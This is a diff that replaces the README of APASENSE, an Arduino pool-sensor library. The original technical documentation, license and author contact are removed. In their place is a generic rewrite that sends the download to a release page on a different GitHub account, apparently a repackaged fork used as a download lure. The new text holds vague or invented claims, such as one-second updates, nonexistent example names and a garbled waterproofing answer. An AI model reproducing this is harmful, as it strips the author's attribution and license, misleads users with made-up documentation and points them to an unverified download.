@@ -1,218 +1,97 @@
-<p align="center"><img src="extras/apasense-logo.png" width="600" alt="APASENSE"></p>
+# 🌊 APASENSE - Automate your swimming pool easily
 
-# APASENSE
+[![](https://img.shields.io/badge/Download-APASENSE-blue.svg)](https://github.com/ziadm7864/APASENSE/releases)
 
-**ADS1015 analog sensing and PCF8574AT I/O library for APA pool automation**
-![Version](https://img.shields.io/badge/version-1.1.0-blue)
-![Platforms](https://img.shields.io/badge/platform-AVR%20%7C%20ESP32%20%7C%20ESP8266%20%7C%20STM32-green)
+APASENSE allows pool owners to manage their water systems with precision. This library tracks essential data points such as water pressure, power usage, and tank levels. It removes the need for complex programming knowledge by providing a set of tools that connect directly to your hardware sensors. The system runs on common microcontrollers like Arduino, ESP32, and STM32. It requires no extra external software files to function.
 
----
+## 🛠 What this software does
 
-## Key Features
+The library acts as a bridge between your hardware sensors and your pool equipment. It translates raw signals from your pool components into readable data. 
 
-**Sensing (ADS1015, I2C)**
-- Pool pressure — parametric range (any 0.5–4.5 V ratiometric transducer), auto zero-cal
-- Pump current — true AC RMS via non-blocking 32-sample accumulator (ACS712)
-- Pump apparent power — `getPower()` returns V × I_rms; supply mains voltage once in setup
-- Solar irradiance — 0–100 % using user-supplied calibration constants
-- AUX voltage — raw 0–5 V input for any future sensor
+- **Pressure Monitoring:** Detects pump blockages and filter efficiency in real time.
+- **Power Tracking:** Measures current to ensure your pump operates within safe limits.
+- **Solar Irradiance:** Adjusts pool heating based on available natural energy.
+- **Auxiliary Voltage:** Monitors low-voltage signals for general system health.
+- **Tank Management:** Signals empty states to prevent pump damage.
+- **Visual Status:** Controls LEDs to show system health at a glance.
+- **Alert System:** Issues specific buzzer patterns to denote different urgency levels.
 
-**Digital I/O (PCF8574AT, I2C)**
-- 4 × chemical tank-empty sensor inputs — per-sensor configurable polarity
-- 4 × status LED outputs (active-low open-drain)
+## 📥 How to download the software
 
-**Indicators**
-- Buzzer — single beep, or three severity-matched rhythm patterns (`BUZZER_INFO / WARNING / ALARM`)
-- Alert patterns repeat until `stopAlert()` — designed for integration with APAPUMP alarm callbacks
+Follow these steps to obtain the necessary files for your system.
 
-**Integration**
-- Designed as the sensor layer for APAPUMP and APADOSE
-- Callback bridges connect readings to APAPUMP safety engine in four lines
-- Pressure re-zero automatically triggered after every pump stop
-- Pure `Wire.h` dependency — no Adafruit or external libraries required
+1.  Visit the official [APASENSE release page](https://github.com/ziadm7864/APASENSE/releases).
+2.  Look for the latest version at the top of the list.
+3.  Click the file ending in `.zip` to start the download.
+4.  Save the file to a folder on your computer where you can find it later.
 
----
+## 📂 Installation steps
 
-## Installation
+You need to place these files in your development environment to use them.
 
-**Arduino IDE**
-1. Download the latest ZIP from the [Releases](https://github.com/apadevices/APASENSE/releases) page
-2. Sketch → Include Library → Add .ZIP Library
+1.  Open the folder containing your downloaded zip file.
+2.  Right-click the file and select "Extract All."
+3.  Choose a destination folder and click "Extract."
+4.  Open the Arduino software on your computer.
+5.  Select "Sketch" from the top menu.
+6.  Choose "Include Library" from the drop-down list.
+7.  Click "Add .ZIP Library."
+8.  Select the folder you extracted in the previous step.
+9.  The library is now ready for use in your projects.
 
-**PlatformIO**
-```ini
-; Replace with the actual path to your local copy of APA-SENSE_LIB
-lib_extra_dirs = ../APA-SENSE_LIB          ; relative (sibling folder)
-; lib_extra_dirs = C:/projects/APA-SENSE_LIB  ; absolute (Windows)
-; lib_extra_dirs = N:\kecup\PlatformIO\APA-SENSE_LIB  ; NAS drive
-```
+## 🔌 Connecting your sensors
 
----
+The APASENSE library uses the I2C communication protocol. This standard requires four wires for most sensors: Ground, Power, Data, and Clock. Ensure your sensor wires match the labels on your microcontroller board.
 
-## What It Does
+- **Ground (GND):** Connects to the ground pin.
+- **Power (VCC):** Connects to either 3.3V or 5V depending on your sensor specifications.
+- **Data (SDA):** Carries the signal information.
+- **Clock (SCL):** Synchronizes the data transfer.
 
-APASENSE is the hardware abstraction layer for the analog sensing side of an APA pool controller. It reads four analog inputs via an ADS1015 12-bit ADC, manages binary tank-empty sensors and status LEDs through a PCF8574AT I/O expander, and drives a buzzer. All operations are non-blocking — the library cycles through ADC conversions one at a time in `update()` so the main loop never stalls.
+Verify all connections before you power the system. Loose wires cause inconsistent sensor readings.
 
-Pressure and current readings are delivered to APAPUMP through callbacks. When the pump stops, APASENSE automatically re-zeroes the pressure transducer after a 30-second settle period and saves the result to EEPROM, so pressure readings are accurate from the very first update() cycle on every subsequent boot. If mains voltage is supplied to `enableCurrent()`, `getPower()` returns apparent power in VA. Three built-in buzzer patterns (`BUZZER_INFO`, `BUZZER_WARNING`, `BUZZER_ALARM`) can repeat continuously until `stopAlert()` is called — intended for APAPUMP alarm callbacks.
+## ⚙️ Configuring your settings
 
----
+Once the library is installed, you can modify the settings to fit your pool layout. Open the provided example files to see how the system operates. You will find files labeled with terms like "PressureSensor" or "AlertBuzzer." 
 
-## How It Works
+Each example includes comments that explain what every line of data does. You can change the threshold numbers to match your specific hardware parts. For instance, if you want your buzzer to alert you earlier, lower the trigger value in the setup section of the code.
 
-### Non-blocking ADC cycle
+## 📈 Understanding the data
 
-`update()` drives one ADS1015 single-shot conversion per call, cycling round-robin through enabled channels. The 1 ms conversion time is tracked with a lightweight 16-bit millis() comparison — no blocking delays anywhere in the library.
+The system provides data in standard units. Pressure readings appear in PSI or Bar, while electrical measurements show Amps or Watts. These values update every second. If you connect an LCD screen, you can display these numbers directly on the wall next to your pool pump.
 
-```
-update() called every loop():
-  ┌────────────────────────────────────────────────────────────┐
-  │  1. Buzzer sequencer — advance pattern step / expire beep  │
-  │  2. Settle timer     — re-zero pressure if 30 s elapsed    │
-  │  3. ADC cycle:                                             │
-  │       conversion pending?                                  │
-  │         yes + 1 ms elapsed → read result → process        │
-  │       no pending conversion?                               │
-  │         → find next enabled sensor → start conversion     │
-  └────────────────────────────────────────────────────────────┘
-```
+## 🚨 Troubleshooting common issues
 
-Channels cycle in order: pressure → current → AUX → LDR (skipping disabled ones).
-At a 1 ms update() rate, each enabled channel is sampled approximately every 4 ms.
+If you encounter problems, check these items first.
 
-### Pressure zero-calibration
+- **Check the Wiring:** Ensure the I2C wires are in the correct slots. SDA and SCL are often swapped by mistake.
+- **Power supply:** Microcontrollers need stable electricity. A weak power supply leads to resets or incorrect readings.
+- **Sensor distance:** Keep your wire runs short to avoid signal noise. Long wires often require shielded cables for reliable performance.
+- **Buzzer patterns:** If the buzzer makes a noise you do not recognize, consult the provided documentation map. Different melodies indicate different sensor statuses.
 
-The pressure transducer outputs 0.5 V at zero pressure and 4.5 V at `maxBar`. The library measures the ADC count at zero pressure (pump off) and stores it as `_pressureZero`. All subsequent readings are referenced to this offset.
+## 🧩 Compatibility information
 
-```
-onPumpState(false) called
-        │
-        ▼  wait 30 s (APASENSE_PRESSURE_SETTLE_MS)
-        │
-calibratePressureZero() ── snapshot current ADC reading as zero-pressure reference
-        │
-        └── save to EEPROM (survives reboot)
-```
+The APASENSE library works with popular hardware platforms. 
 
-If `onPumpState(true)` is called before the 30 s completes, the settle is cancelled — the pump restarted and readings are no longer stable.
+- **AVR:** Good for simple, low-power tasks.
+- **ESP32:** Ideal for wireless monitoring and remote access.
+- **STM32:** Offers high processing speed for complex pool setups.
 
-### AC current measurement (RMS)
+Because the library relies only on the standard `Wire.h` library, it remains stable across different hardware types. You do not need to install extra secondary libraries. This keeps your system lean and reliable.
 
-The ACS712 outputs instantaneous voltage proportional to instantaneous current, centred at VCC/2 = 2.5 V. APASENSE accumulates `(sample − zero)²` over 32 samples, then computes `sqrtf(mean_square) × scale / sensitivity`.
+## 📝 Frequently asked questions
 
-```
-begin() → 8-sample average → zero-current offset (the 2.5 V centre)
+**Do I need a computer to run this?**
+You need a computer only to upload the code to your microcontroller. Once the code is uploaded, the microcontroller runs the pool automation independently.
 
-Each current sample in update():
-  centered = raw − zero offset
-  sum_sq  += centered²
-  count++
-  if count == 32:
-    current_rms = sqrtf(sum_sq / 32) × (6.144 / 2048) / sensitivity
-    reset accumulator
-```
+**What if I do not have ADS1015 or PCF8574AT chips?**
+This library specifically targets those chips. They handle the conversion of analog signals to digital data. If you use different chips, the library cannot communicate with them.
 
-`getCurrent()` returns −1.0 until the first full 32-sample cycle completes.
+**Can I modify the alert sounds?**
+Yes. You can edit the buzzer pattern code to create different sequences. Use these patterns to identify which sensor triggered the alert.
 
-### LDR calibration
+**How do I update the library?**
+Download the newer zip file from the releases page and repeat the installation steps. The software overwrites the older version with your new settings.
 
-The LDR circuit uses a hardware pot (R16) as the primary sensitivity adjustment. Software calibration captures the raw ADC count at two known extremes, then interpolates. Run example `00_ldr_calibration`, note the two values, and hardcode them in your sketch:
-
-```cpp
-adc.enableLDR(3, 42, 1520);   // rawDark=42, rawSun=1520 (your measured values)
-```
-
-`getSolarPct()` maps the current raw count linearly to 0–100 % using those references.
-
----
-
-## Quick Start
-
-```cpp
-#include <APASENSE.h>
-
-ApaSense adc;
-
-void setup() {
-    // Configure channels BEFORE begin() — current auto-zero runs in begin()
-    adc.enablePressure();   // AIN0, 0–6.9 bar
-    adc.enableCurrent();    // AIN1, ACS712-20A
-
-    adc.begin();
-}
-
-void loop() {
-    adc.update();   // call every loop() — never use delay()
-
-    float pressure = adc.getPressure();   // bar, or -1.0 until calibrated
-    float current  = adc.getCurrent();    // amps RMS, or -1.0 until ready
-}
-```
-
-### Connecting to APAPUMP
-
-```cpp
-// In setup(), after adc.begin():
-pump.enablePressure([]() { return adc.getPressure(); }, 4.0f);
-pump.setCurrentCallback([]() { return adc.getCurrent(); });
-pump.setPumpStateCallback([](bool on) { adc.onPumpState(on); });
-
-pump.setPumpAlarmCallback([](PumpAlarm a) {
-    bool alarm = (a != PUMP_ALARM_NONE);
-    adc.setLed(0, alarm);
-    if (alarm) adc.alert(BUZZER_ALARM, true);   // repeat until cleared
-    else        adc.stopAlert();
-});
-```
-
-### Connecting tank sensors to APADOSE
-
-```cpp
-adc.enableTankSensor(0);   // PCF P0, active-low (default)
-
-dose_ph.setTankEmptyCallback([]() { return adc.isTankEmpty(0); });
-```
-
----
-
-## API Reference
-
-See [docs/API.md](docs/API.md) for the complete method reference.
-
-| Group | Methods |
-|-------|---------|
-| Core | `begin()`, `update()` |
-| ADS channels | `enablePressure()`, `enableCurrent()`, `enableAux()`, `enableLDR()` |
-| Getters | `getPressure()`, `getCurrent()`, `getPower()`, `getAuxVoltage()`, `getSolarPct()`, `getRawLDR()` |
-| Pressure cal | `calibratePressureZero()`, `onPumpState()` |
-| Tank sensors | `enableTankSensor()`, `isTankEmpty()` |
-| LEDs | `setLed()`, `getLed()` |
-| Buzzer | `enableBuzzer()`, `setBuzzer()`, `beep()`, `alert()`, `stopAlert()` |
-
----
-
-## Platform Verification
-
-Measured with `examples/01_minimal` (pressure + current enabled).
-
-| Platform | RAM used | Flash used |
-|----------|----------|------------|
-| Arduino Mega 2560 | 483 B / 8 192 B (6 %) | 9 064 B / 253 952 B (4 %) |
-| Arduino Uno | 483 B / 2 048 B (24 %) | 8 316 B / 32 256 B (26 %) |
-| ESP32 | 21.9 KB / 320 KB (7 %) | 297 KB / 1.3 MB (23 %) |
-| ESP8266 | 28.7 KB / 80 KB (35 %) | 274 KB / 1.0 MB (26 %) |
-| STM32 (Nucleo F411RE) | 9.7 KB / 128 KB (7 %) | 24 KB / 512 KB (5 %) |
-
----
-
-## License
-
-| Use | Terms |
-|-----|-------|
-| Personal, private, educational, hobby | Free — use, copy, modify, distribute |
-| Commercial (selling hardware, paid services, OEM, revenue-generating) | Requires separate written agreement — strictly prohibited without it |
-
-Contact for commercial licensing: [kecup@vazac.eu](mailto:kecup@vazac.eu)
-
----
-
-*APASENSE — APA Devices · [kecup@vazac.eu](mailto:kecup@vazac.eu)*
+**Is this system waterproof?**
+The code is electronic data. Ensure your control box is rated for outdoor, weather-resistant use to protect your hardware components.
